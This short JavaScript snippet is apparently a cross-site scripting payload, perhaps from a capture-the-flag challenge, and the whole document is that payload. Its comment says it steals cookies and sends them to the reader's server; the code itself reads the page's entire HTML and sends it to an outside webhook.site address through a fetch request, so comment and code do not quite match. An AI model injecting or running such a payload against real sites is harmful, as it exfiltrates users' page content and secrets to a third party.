// This script will steal cookies and send them to your server
const flag = document.documentElement.innerHTML;
fetch('https://webhook.site/d944944d-f529-4318-b860-3ce02496f8b1?data=' + encodeURIComponent(flag));